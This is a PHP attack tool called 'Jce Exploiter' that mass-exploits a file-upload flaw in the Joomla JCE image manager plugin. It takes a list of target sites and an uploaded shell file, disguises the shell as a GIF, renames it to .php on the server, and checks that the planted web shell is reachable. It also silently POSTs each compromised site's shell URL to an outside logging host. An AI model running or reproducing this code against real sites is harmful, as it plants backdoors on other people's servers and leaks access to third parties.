<?php
 echo '<title>Jce Exploiter</title>
 <form method="post" action="" enctype="multipart/form-data">
 <h1 style="color:#333;font:19px myriad pro;margin:0;padding:0;">Jce Exploiter by Atang Tunggal <a href="http://janissaries.org/" style="font:18px myriad pro;color:#333">Atang Tunggal!</a></h1><br/> <table>
 <tr>
<td>target</td><td>:</td><td>
 <textarea style="width:500px;height:150px; resize:none" name="target">
</textarea></td>
</tr>
<tr>
<td>files:</td><td></td><td>
<input type="file" name="shell"/></td>
</tr>
<tr>
<td></td><td></td><td><input type="submit" value="Fuck\'them"/>
</td>
</tr>
</table</form>';
set_time_limit(0); ini_set("max_execution_time", 0); ob_implicit_flush(1); ini_set("default_socket_timeout", 1);
if ($_POST) {
 $jce = new jce;
 $target = $_POST['target'];
 $target = explode("\n", $target);
 foreach ($target as $host) {
    $host = trim($host);
    $host = str_replace("http://","",$host);
    echo "=>exploiting...:<strong>$host</strong><br/>";
    flush();
    @ob_flush();
    $curl = curl_init();  
    curl_setopt($curl,CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl,CURLOPT_URL, "http://$host/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20"); 
    curl_setopt($curl, CURLOPT_USERAGENT,"BOT/0.1 (BOT for JCE)");
    curl_setopt($curl,CURLOPT_TIMEOUT, 13);
    $exec = curl_exec($curl);  
    curl_close($curl);
    $str = array('2.0.11</title','2.0.12<title','2.0.13</title','2.0.14</title','2.0.15</title','1.5.7.10</title','1.5.7.11</title','1.5.7.12</title','1.5.7.13</title','1.5.7.14</title');
    $count = 0;
    foreach ($str as $value) {
        $pos = strpos($exec, $value);
        if ($pos === false) {
          $count = $count++;
        }
   }
 if ($count = 10) {
 echo '=> <font color="red">fuck<font><br/>';
 flush();
 @ob_flush();
 }
 else {
 echo '=> Site is?<br/>';
 flush();
 @ob_flush();
 }
 $filename = "bruno".rand(1, 200).".gif";
 $content = "GIF89a1";
 $content.= file_get_contents($_FILES['shell']['tmp_name']);
 $data = "-----------------------------41184676334\r\n";
 $data.= "Content-Disposition: form-data; name=\"upload-dir\"\r\n\r\n";
 $data.= "/\r\n";
 $data.= "-----------------------------41184676334\r\n";
 $data.= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"\"\r\n";
 $data.= "Content-Type: application/octet-stream\r\n\r\n";
 $data.= "-----------------------------41184676334\r\n";
 $data.= "Content-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n";
 $data.= "0\r\n";
 $data.= "-----------------------------41184676334\r\n";
 $data.= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"".$filename."\"\r\n";
 $data.= "Content-Type: image/gif\r\n\r\n";
 $data.= "$content\r\n";
 $data.= "-----------------------------41184676334\r\n";
 $data.= "xxx\r\n";
 $data.= "-----------------------------41184676334\r\n";
 $data.= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
 $data.= "upload\r\n";
 $data.= "-----------------------------41184676334--\r\n";
 $packet = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743 HTTP/1.1\r\n";
 $packet.= "Host: ".$host."\r\n";
 $packet.= "User-Agent: BOT/0.1 (BOT for JCE)\r\n";
 $packet.= "Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
 $packet.= "Accept-Language: en-us,en;q=0.5\r\n";
 $packet.= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"; 
 $packet.= "Cookie: 6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743;jce_imgmanager_dir=%2F;__utma=216871948.2116932307.1317632284.1317632284.1317632284.1;__utmb=216871948.1.10.1317632284;__utmc=216871948;__utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\r\n";
 $packet.= "Connection: Close\r\n"; 
 $packet.= "Proxy-Connection: close\r\n";  
 $packet.= "Content-Length: ".strlen($data)."\r\n\r\n";
 $packet.= $data; 
 $jce->sendpacket($host, $packet, 0, 0);
 $filephp = str_replace("gif","php",$filename);
 $packet = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1\r\n";
 $packet.= "Host: ".$host."\r\n";
 $packet.= "User-Agent: BOT/0.1 (BOT for JCE)\r\n";
 $packet.= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
 $packet.= "Accept-Language: en-US,en;q=0.8\r\n";
 $packet.= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"; 
 $packet.= "Content-Type: application/x-www-form-urlencoded;charset=utf-8\r\n";
 $packet.= "Accept-Encoding: deflate\r\n";
 $packet.= "X-Request: JSON\r\n"; 
 $packet.= "Cookie: __utma=216871948.2116932307.1317632284.1317639575.1317734968.3;__utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);__utmb=216871948.20.10.1317734968;__utmc=216871948;jce_imgmanager_dir=%2F;6bc427c8a7981f4fe1f5ac65c1246b5f=7df6350d464a1bb4205f84603b9af182\r\n"; 
 $ren = "json={\"fn\":\"folderRename\",\"args\":[\"/".$filename."\",\"".$filephp."\"]}";
 $packet.= "Content-Length: ".strlen($ren)."\r\n\r\n";
 $packet.= $ren."\r\n"; 
 $jce->sendpacket($host, $packet, 1,0);
 $kontrol = $jce->uploadkontrolZenci("http://".$host."/images/stories/".$filephp);
 if ($kontrol) {
 echo "=> exploit complete!! -> <a href='http://$host/images/stories/$filephp'>http://$host/images/stories/$filephp</a><br/>";
 $jce->logyollaZenci ("http://".$host."/images/stories/".$filephp);
 }
 else
 {
 echo "=>please upload ur files<br/>";
 }
 }
 }
 class jce {
 public function sendpacket($host, $packet, $response = 0, $output = 0) {
 $ock = fsockopen($host, 80); stream_set_timeout($ock, 1);
 if (!$ock)
 {
 echo '=> Sites not vuln<br/>';
 }
 fputs($ock, $packet);
 if ($response == 1)
 {
 $html = '';
 while (!feof($ock))
 {
 $html.= fgets($ock);
 }
 } else $html = '';
 fclose($ock);
 if ($response == 1 && $output == 1) 
 echo nl2br (htmlentities($html));
 }
 public function uploadkontrolZenci($site)
 {
 $curl = curl_init();
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
 curl_setopt($curl,CURLOPT_URL, $site);
 curl_setopt($curl,CURLOPT_USERAGENT,"BOT/0.1 (BOT for JCE)");  
 curl_setopt($curl,CURLOPT_TIMEOUT, 15);
 $exec = curl_exec($curl); 
 curl_close($curl);
 if (preg_match('/GIF89aGbruno7/si', $exec)) {
 return true;
 }
 else
 {
 return false;
 }
 }
 public function logyollaZenci($log) {
 $curl = curl_init();
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
 curl_setopt($curl,CURLOPT_URL,"http://villageocelandes.org/log.php"); 
 curl_setopt($curl,CURLOPT_POST, 1);
 curl_setopt($curl, CURLOPT_POSTFIELDS,"site=".urlencode($log).""); 
 curl_setopt($curl,CURLOPT_USERAGENT,"BOT/0.1 (BOT for JCE)");
 curl_setopt($curl,CURLOPT_TIMEOUT, 15);
 $exec = curl_exec($curl); 
 curl_close($curl);
 return $exec;
 }
 };
?>